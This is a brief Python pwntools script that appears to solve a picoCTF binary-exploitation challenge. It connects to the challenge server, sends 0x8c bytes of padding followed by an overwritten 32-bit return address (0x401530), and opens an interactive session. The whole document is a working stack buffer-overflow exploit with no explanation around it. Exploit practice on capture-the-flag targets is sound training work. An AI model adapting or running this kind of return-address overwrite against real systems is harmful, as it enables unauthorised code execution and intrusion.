from pwn import *

r = remote("saturn.picoctf.net", 53396)
# r = process("./vuln.exe")
r.recvline()
context.newline = b'\r\n'
payload = b'a'*0x8c + p32(0x401530)
r.sendline(payload)

r.interactive()